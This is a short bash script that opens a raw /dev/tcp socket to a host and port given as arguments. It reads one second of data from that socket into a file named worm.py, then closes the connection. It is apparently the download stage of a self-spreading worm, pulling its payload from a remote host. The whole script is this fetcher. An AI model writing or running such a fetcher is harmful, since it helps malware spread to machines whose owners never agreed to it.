#!/bin/bash

host=$1;
port=$2;

exec 6<>/dev/tcp/${host}/${port}


timeout 1 cat <&6 > worm.py
#close input socket
exec 6<&-
#close output socket
exec 6>&-



